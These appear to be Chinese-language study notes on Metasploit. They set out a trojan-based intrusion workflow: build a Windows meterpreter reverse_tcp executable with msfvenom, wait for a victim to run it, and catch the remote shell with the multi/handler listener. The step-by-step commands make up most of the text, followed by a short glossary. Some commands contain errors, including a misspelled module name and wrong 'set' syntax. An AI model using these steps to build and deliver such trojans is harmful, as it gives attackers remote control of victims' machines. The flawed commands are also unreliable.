### 基于木马的渗透一般流程：

> 1. 使用msfvenom<mark>生成</mark>木马
> 2. 等待对方<mark>上钩</mark>
> 3. 使用handler模块<mark>利用</mark>木马

### windows平台简单渗透测试
1. **木马生成：** `msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP> lport=<port> -f exe -o payload.exe`
2. **利用木马之前的配置：**
   1. `msfconsole` 进入MSF框架主控制台
   2. `use exploit/multi/hander` 使用模块
   3. `set payload windows/meterpreter/reverse_tcp` 设置攻击载荷
   4. `set lhost=<IP>`
   5. `set lport=<port>`
3. **执行：** `exploit | run`
4. **出现 <u>meterpreter></u> 即为成功** 
### msf(metasploit-frameword)简单理解
​	msf是一款可以快速利用已发现的漏洞或快速生成木马，进而进行渗透的框架。其模块和渗透成功后的执行脚本大多都是以Ruby语言实现的。
##### 渗透成功后的操作：
-  meterpreter
-  shell
##### 主要工具：
- `msfvenom`	可以生成多平台的木马
##### 主要模块：
-  `auxiliary`辅助模块
-  `exploit`漏洞模块
-  `payload`攻击载荷模块
##### 主要命令：
- `use <moudule name> | <moudul index>`使用模块
- `show options` 列出当前使用的模块的配置参数
- `set <key>=<value>` 配置模块个属性的值
- `run` 一切准备就绪，开始监听